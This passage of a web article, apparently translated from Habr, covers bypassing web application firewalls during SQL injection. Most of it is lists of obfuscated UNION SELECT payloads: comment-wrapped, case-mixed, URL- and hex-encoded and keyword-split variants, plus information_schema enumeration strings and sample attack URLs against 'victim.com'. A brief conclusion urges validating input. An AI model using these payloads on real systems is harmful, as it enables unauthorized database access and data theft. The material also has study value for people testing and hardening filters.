</li><li>  Vulnerabilities of application logic (and / or). </li></ul><br><h3>  Signature Bypass Examples </h3><br><pre> <code class="hljs mel"><span class="hljs-comment"><span class="hljs-comment">/*!%55NiOn*/</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!%53eLEct*/</span></span> %55nion(%53elect <span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>)-- - +union+distinct+<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+ +union+distinctROW+<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+ <span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-comment"><span class="hljs-comment">/*!12345UNION SELECT*/</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span> concat(<span class="hljs-number"><span class="hljs-number">0x223e</span></span>,@@version) concat(<span class="hljs-number"><span class="hljs-number">0x273e27</span></span>,version(),<span class="hljs-number"><span class="hljs-number">0x3c212d2d</span></span>) concat(<span class="hljs-number"><span class="hljs-number">0x223e3c62723e</span></span>,version(),<span class="hljs-number"><span class="hljs-number">0x3c696d67207372633d22</span></span>) concat(<span class="hljs-number"><span class="hljs-number">0x223e</span></span>,@@version,<span class="hljs-number"><span class="hljs-number">0x3c696d67207372633d22</span></span>) concat(<span class="hljs-number"><span class="hljs-number">0x223e</span></span>,<span class="hljs-number"><span class="hljs-number">0x3c62723e3c62723e3c62723e</span></span>,@@version,<span class="hljs-number"><span class="hljs-number">0x3c696d67207372633d22</span></span>,<span class="hljs-number"><span class="hljs-number">0x3c62</span></span>‚Äã<span class="hljs-number"><span class="hljs-number">723</span></span>e) concat(<span class="hljs-number"><span class="hljs-number">0x223e3c62723e</span></span>,@@version,<span class="hljs-number"><span class="hljs-number">0x3a</span></span>,‚ÄùBlackRose‚Äù,<span class="hljs-number"><span class="hljs-number">0x3c696d67207372633d22</span></span>) concat(<span class="hljs-string"><span class="hljs-string">''</span></span>,@@version,<span class="hljs-string"><span class="hljs-string">''</span></span>) <span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-comment"><span class="hljs-comment">/*!50000UNION SELECT*/</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span> <span class="hljs-comment"><span class="hljs-comment">/**/</span></span>UNION<span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-comment"><span class="hljs-comment">/*!50000SELECT*/</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!50000UniON SeLeCt*/</span></span> union <span class="hljs-comment"><span class="hljs-comment">/*!50000%53elect*/</span></span> +#uNiOn+#sEleCt +#<span class="hljs-number"><span class="hljs-number">1</span></span>q%0AuNiOn all#qa%0A#%0AsEleCt <span class="hljs-comment"><span class="hljs-comment">/*!%55NiOn*/</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!%53eLEct*/</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!u%6eion*/</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!se%6cect*/</span></span> +un<span class="hljs-comment"><span class="hljs-comment">/**/</span></span>ion+se<span class="hljs-comment"><span class="hljs-comment">/**/</span></span>lect uni%0bon+se%0blect %2f**%2funion%2f**%2fselect union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A REVERSE(noinu)+REVERSE(tceles) <span class="hljs-comment"><span class="hljs-comment">/*--*/</span></span>union<span class="hljs-comment"><span class="hljs-comment">/*--*/</span></span><span class="hljs-keyword"><span class="hljs-keyword">select</span></span><span class="hljs-comment"><span class="hljs-comment">/*--*/</span></span> union (<span class="hljs-comment"><span class="hljs-comment">/*!/**/</span></span> SeleCT */ <span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-comment"><span class="hljs-comment">/*!union*/</span></span>+<span class="hljs-comment"><span class="hljs-comment">/*!select*/</span></span> union+<span class="hljs-comment"><span class="hljs-comment">/*!select*/</span></span> <span class="hljs-comment"><span class="hljs-comment">/**/</span></span>union<span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-keyword"><span class="hljs-keyword">select</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span> <span class="hljs-comment"><span class="hljs-comment">/**/</span></span>uNIon<span class="hljs-comment"><span class="hljs-comment">/**/</span></span>sEleCt<span class="hljs-comment"><span class="hljs-comment">/**/</span></span> <span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-comment"><span class="hljs-comment">/*!union*/</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span><span class="hljs-comment"><span class="hljs-comment">/*!select*/</span></span><span class="hljs-comment"><span class="hljs-comment">/**/</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!uNIOn*/</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!SelECt*/</span></span> +union+distinct+<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+ +union+distinctROW+<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>+ +UnIOn%0d%0aSeleCt%0d%0a UNION<span class="hljs-comment"><span class="hljs-comment">/*&amp;test=1*/</span></span>SELECT<span class="hljs-comment"><span class="hljs-comment">/*&amp;pwn=2*/</span></span> un?+un<span class="hljs-comment"><span class="hljs-comment">/**/</span></span>ion+se<span class="hljs-comment"><span class="hljs-comment">/**/</span></span>lect+ +UNunionION+SEselectLECT+ +uni%0bon+se%0blect+ %252f%252a*/union%252f%252a /<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>%252f%252a*/ /%2A%2A/union/%2A%2A/<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>/%2A%2A/ %2f**%2funion%2f**%2fselect%2f**%2f union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A <span class="hljs-comment"><span class="hljs-comment">/*!UnIoN*/</span></span>SeLecT+</code> </pre> <br><h3>  Examples of url-encoded during union select queries </h3><br><pre> <code class="hljs perl"> %55nion(%53elect) union%20distinct%20select union%20%64istinctRO%57%20select union%2053elect %23?%0auion%20?%23?%0aselect %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect %55nion %53eLEct u%6eion se%6cect unio%6e %73elect unio%6e%20%64istinc%74%20%73elect uni%6fn distinct%52OW <span class="hljs-keyword"><span class="hljs-keyword">s</span></span>%65lect %75%6e%6f%69%6e %61%6c%6c %73%65%6c%65%63%7</code> </pre> <br><h3>  Examples of mixed query content </h3><br><pre> <code class="hljs pgsql">unhex(hex(Concat(<span class="hljs-built_in"><span class="hljs-built_in">Column_Name</span></span>,<span class="hljs-number"><span class="hljs-number">0x3e</span></span>,Table_schema,<span class="hljs-number"><span class="hljs-number">0x3e</span></span>,<span class="hljs-built_in"><span class="hljs-built_in">table_Name</span></span>))) <span class="hljs-comment"><span class="hljs-comment">/*!from*/</span></span>information_schema.<span class="hljs-keyword"><span class="hljs-keyword">columns</span></span><span class="hljs-comment"><span class="hljs-comment">/*!where*/</span></span><span class="hljs-built_in"><span class="hljs-built_in">column_name</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-comment"><span class="hljs-comment">/*!like*/</span></span><span class="hljs-type"><span class="hljs-type">char</span></span>(<span class="hljs-number"><span class="hljs-number">37</span></span>,%<span class="hljs-number"><span class="hljs-number">20112</span></span>,%<span class="hljs-number"><span class="hljs-number">2097</span></span>,%<span class="hljs-number"><span class="hljs-number">20115</span></span>,%<span class="hljs-number"><span class="hljs-number">20115</span></span>,%<span class="hljs-number"><span class="hljs-number">2037</span></span>)</code> </pre> <br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">union</span></span> <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,unhex(hex(Concat(<span class="hljs-built_in"><span class="hljs-built_in">Column_Name</span></span>,<span class="hljs-number"><span class="hljs-number">0x3e</span></span>,Table_schema,<span class="hljs-number"><span class="hljs-number">0x3e</span></span>,<span class="hljs-built_in"><span class="hljs-built_in">table_Name</span></span>))),<span class="hljs-number"><span class="hljs-number">4</span></span>,<span class="hljs-number"><span class="hljs-number">5</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!from*/</span></span>information_schema.<span class="hljs-keyword"><span class="hljs-keyword">columns</span></span><span class="hljs-comment"><span class="hljs-comment">/*!where*/</span></span><span class="hljs-built_in"><span class="hljs-built_in">column_name</span></span>%<span class="hljs-number"><span class="hljs-number">20</span></span><span class="hljs-comment"><span class="hljs-comment">/*!like*/</span></span><span class="hljs-type"><span class="hljs-type">char</span></span>(<span class="hljs-number"><span class="hljs-number">37</span></span>,%<span class="hljs-number"><span class="hljs-number">20112</span></span>,%<span class="hljs-number"><span class="hljs-number">2097</span></span>,%<span class="hljs-number"><span class="hljs-number">20115</span></span>,%<span class="hljs-number"><span class="hljs-number">20115</span></span>,%<span class="hljs-number"><span class="hljs-number">2037</span></span>)?</code> </pre> <br><h3>  Signature replacement examples </h3><br><pre> <code class="hljs perl">http:<span class="hljs-regexp"><span class="hljs-regexp">//victim</span></span>.com/news.php?id=<span class="hljs-number"><span class="hljs-number">1</span></span>+UNunionION+SEselectLECT+<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>-- http:<span class="hljs-regexp"><span class="hljs-regexp">//victim</span></span>.com/news.php?id=<span class="hljs-number"><span class="hljs-number">1</span></span>+uni%0bon+se%0blect+<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>--</code> </pre> <br><h3>  Buffer overflow </h3><br><pre> <code class="hljs pgsql"> http://www.site.com/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php?page_id=<span class="hljs-number"><span class="hljs-number">-15</span></span>+<span class="hljs-keyword"><span class="hljs-keyword">and</span></span>+(<span class="hljs-keyword"><span class="hljs-keyword">select</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>)=(<span class="hljs-keyword"><span class="hljs-keyword">Select</span></span> <span class="hljs-number"><span class="hljs-number">0xAA</span></span>[..(   <span class="hljs-number"><span class="hljs-number">1000</span></span> ‚ÄúA‚Äù)..])+<span class="hljs-comment"><span class="hljs-comment">/*!uNIOn*/</span></span>+<span class="hljs-comment"><span class="hljs-comment">/*!SeLECt*/</span></span>+<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span>‚Ä¶.</code> </pre> <br><h3>  HEX / url encoding </h3><br><pre> <code class="hljs pgsql">http://www.site.com/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php?page_id=<span class="hljs-number"><span class="hljs-number">-15</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!u%6eion*/</span></span> <span class="hljs-comment"><span class="hljs-comment">/*!se%6cect*/</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span>‚Ä¶.</code> </pre> <br><h3>  Cleaning up "weird" characters or functions </h3><br><pre> <code class="hljs pgsql"> http://www.site.com/<span class="hljs-keyword"><span class="hljs-keyword">index</span></span>.php?page_id=<span class="hljs-number"><span class="hljs-number">-15</span></span>+uni*<span class="hljs-keyword"><span class="hljs-keyword">on</span></span>+sel*ect+<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-number"><span class="hljs-number">2</span></span>,<span class="hljs-number"><span class="hljs-number">3</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span>‚Ä¶</code> </pre> <br><h2>  Conclusion </h2><br><p>  Adhere to the rule: all input is evil until proven otherwise. <br>  Carefully check incoming data. <br>  Carefully check incoming data. <br>  Carefully check incoming data. <br>  Use comprehensive tools to protect web applications from hacker attacks. </p><br><hr><br><p>  In the next article I will talk about how to bypass the protective means of web applications in the operation of xss-vectors. </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/326362/">https://habr.com/ru/post/326362/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../326352/index.html">I invite you to the exhibition and conference on virtual reality</a></li>
<li><a href="../326354/index.html">How we collected the car in Baumanka: why did the student team need PLM technologies</a></li>
<li><a href="../326356/index.html">How software-defined Cisco TrustSec-based network segmentation can help a business</a></li>
<li><a href="../326358/index.html">Creation of a sapper with the Tkinter module</a></li>
<li><a href="../326360/index.html">Fintech: 7 space career trends</a></li>
<li><a href="../326366/index.html">Lazarus is omnipresent</a></li>
<li><a href="../326368/index.html">Wordpress Games</a></li>
<li><a href="../326372/index.html">How we sped up our DNS stack 3 times</a></li>
<li><a href="../326374/index.html">How airlines make life easier for passengers using SMS</a></li>
<li><a href="../326376/index.html">Go digest Events, articles, interesting projects from the world of Go (March 30 - April 13, 2017)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>